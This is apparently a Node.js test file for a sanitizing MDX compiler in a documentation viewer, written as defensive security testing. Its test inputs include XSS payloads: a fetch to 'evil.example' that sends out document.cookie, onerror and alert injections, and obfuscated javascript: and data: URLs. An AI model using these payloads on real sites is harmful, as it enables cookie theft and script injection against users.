const { test, describe } = require("node:test");
const assert = require("node:assert/strict");
const fs = require("fs");
const path = require("path");
const { compileSafeMdx, isSafeUrl, parseCodeMeta } = require("../mdx/safeMdx");
const { COMPONENT_NAMES } = require("../mdx/components");

const compile = (src) => {
    const result = compileSafeMdx(src);
    assert.equal(result.ok, true, JSON.stringify(result.error));
    return result;
};
const find = (node, pred, out = []) => { if (pred(node)) out.push(node); (node.c || []).forEach((c) => find(c, pred, out)); return out; };
const json = (src) => JSON.stringify(compile(src).tree);

describe("removes code a page could run", () => {
    test("import and export statements", () => {
        const out = json('import x from "y"\nexport const leak = fetch("https://evil.example/" + document.cookie)\n\nHello');
        assert.ok(!out.includes("evil.example") && !out.includes("cookie") && out.includes("Hello"));
    });

    test("{expressions}, keeping {/* comments */} silent", () => {
        const result = compile("Hi {alert(1)} there {/* note */}");
        assert.ok(!JSON.stringify(result.tree).includes("alert"));
        assert.deepEqual(result.warnings, ["Removed {expression}"]);
    });

    test("event handlers, style, ref and spread props", () => {
        const out = json('<Card title="A" onClick={() => alert(1)} onMouseOver="alert(2)" style={{color: "red"}} ref="x" {...evil}>B</Card>');
        for (const bad of ["onClick", "onMouseOver", "alert", "style", "ref", "evil"]) assert.ok(!out.includes(bad), bad);
        assert.ok(out.includes('"title":"A"'));
    });

    test("dangerouslySetInnerHTML and classes on HTML", () => {
        const out = json('<div className="x" dangerouslySetInnerHTML={{__html: "<img src=x onerror=alert(1)>"}}>text</div>');
        assert.ok(!out.includes("dangerously") && !out.includes("onerror") && !out.includes('"className"'));
    });

    test("props that aren't plain data", () => {
        const result = compile('<CodeGenerator method="GET" body={{ a: window.name }} />\n\n<CardGroup cols={Math.max(1, 2)} />');
        const props = find(result.tree, (n) => n.t === "jsx").map((n) => n.p);
        assert.deepEqual(props, [{ method: "GET" }, {}]);
    });

    test("javascript:, data: and obfuscated links", () => {
        for (const href of ["javascript:alert(1)", " java\tscript:alert(1)", "JAVASCRIPT:alert(1)", "data:text/html,<script>alert(1)</script>", "vbscript:x"]) {
            const out = json(`<a href="${href}">x</a>\n\n<Card title="c" href="${href}">y</Card>\n\n[z](${href.replace(/\s/g, "")})`);
            assert.ok(!/script:|data:/i.test(out.replace(/\\t/g, "")), href);
        }
    });

    test("unknown components are unwrapped, keeping their text", () => {
        const out = JSON.stringify(compile('<Evil foo="bar">kept text</Evil>').tree);
        assert.ok(out.includes("kept text") && !out.includes('"n":"Evil"') && !out.includes("foo"));
    });

    test("script, style, iframe and similar are removed with their content", () => {
        const result = compile('<script>window.x = alert(1)</script>\n\n<iframe src="https://x">in frame</iframe>\n\n<noscript>ns</noscript>\n\nAfter');
        const out = JSON.stringify(result.tree);
        assert.ok(!out.includes("alert") && !out.includes("in frame") && !out.includes('"ns"') && out.includes("After"));
        assert.equal(result.warnings.length, 3);
    });
});

describe("keeps the docs", () => {
    test("allowed components with plain-data props", () => {
        const tree = compile('<CardGroup cols={2}>\n<Card title="API" icon="code" href="/api">Docs</Card>\n</CardGroup>\n\n<ParamField name="id" type="string" required>The id</ParamField>\n\n<CodeGenerator method="POST" endpoint="/t" body={{ name: "x", tags: ["a", -1, true, null] }} />').tree;
        assert.deepEqual(find(tree, (n) => n.n === "CardGroup")[0].p, { cols: 2 });
        assert.deepEqual(find(tree, (n) => n.n === "Card")[0].p, { title: "API", icon: "code", href: "/api" });
        assert.deepEqual(find(tree, (n) => n.n === "ParamField")[0].p, { name: "id", type: "string", required: true });
        assert.deepEqual(find(tree, (n) => n.n === "CodeGenerator")[0].p.body, { name: "x", tags: ["a", -1, true, null] });
    });

    test("fenced code becomes a CodeBlock with language, title and highlighted lines", () => {
        const block = find(compile("```js app.js {1,3-4}\nconst a = 1;\n```").tree, (n) => n.n === "CodeBlock")[0];
        assert.deepEqual(block, { t: "jsx", n: "CodeBlock", p: { language: "js", title: "app.js", highlight: "1,3-4" }, c: [{ t: "text", v: "const a = 1;" }] });
        assert.deepEqual(parseCodeMeta('title="server.js"'), { title: "server.js", highlight: undefined });
    });

    test("headings get the same ids as search links, including duplicates", () => {
        const ids = find(compile("## Install\n\ntext\n\n## Install\n\n### API & SDK").tree, (n) => /^h\d$/.test(n.n)).map((n) => n.p.id);
        assert.deepEqual(ids, ["install", "install-1", "api--sdk"]);
    });

    test("GFM tables and task lists, without stray whitespace in table rows", () => {
        const tree = compile("| A | B |\n|---|:-:|\n| 1 | 2 |\n\n- [x] done").tree;
        const row = find(tree, (n) => n.n === "tr")[0];
        assert.ok(row.c.every((c) => c.t === "el"), "only cells inside rows");
        assert.deepEqual(find(tree, (n) => n.n === "input")[0].p, { type: "checkbox", checked: true, disabled: true, readOnly: true });
    });

    test("frontmatter is not rendered", () => {
        assert.ok(!json('---\ntitle: "Hi"\n---\n\nBody').includes("title"));
    });
});

test("reports syntax errors with their position", () => {
    const result = compileSafeMdx("# Hi\n\n<Note>\nunclosed\n");
    assert.equal(result.ok, false);
    assert.equal(result.error.line, 3);
    assert.match(result.error.message, /closing tag/);
});

test("isSafeUrl", () => {
    for (const ok of ["https://x.com", "http://x", "mailto:a@b.c", "/docs", "#top", "./a", "page"]) assert.equal(isSafeUrl(ok), true, ok);
    for (const bad of ["javascript:x", "jav\nascript:x", "data:x", "file:///etc", 42]) assert.equal(isSafeUrl(bad), false, String(bad));
});

test("the docs viewer renders every component in the contract", () => {
    const registry = fs.readFileSync(path.join(__dirname, "../../frontend/src/components/mdx/registry.js"), "utf8");
    const block = registry.slice(registry.indexOf("export const docComponents"));
    const missing = COMPONENT_NAMES.filter((name) => !new RegExp(`\\b${name}\\b`).test(block));
    assert.deepEqual(missing, [], `frontend/src/components/mdx/registry.js is missing: ${missing.join(", ")}`);
});

test("one-line block components aren't wrapped in paragraphs", () => {
    const tree = compile('<Steps>\n  <Step title="A">First.</Step>\n  <Step title="B">Second.</Step>\n</Steps>\n\nUse a <Badge>new</Badge> badge.').tree;
    const steps = find(tree, (n) => n.n === "Steps")[0];
    assert.deepEqual(steps.c.map((c) => c.n), ["Step", "Step"]);
    // Inline components stay inside their sentence.
    assert.equal(find(tree, (n) => n.n === "p" && n.c.some((c) => c.n === "Badge")).length, 1);
});
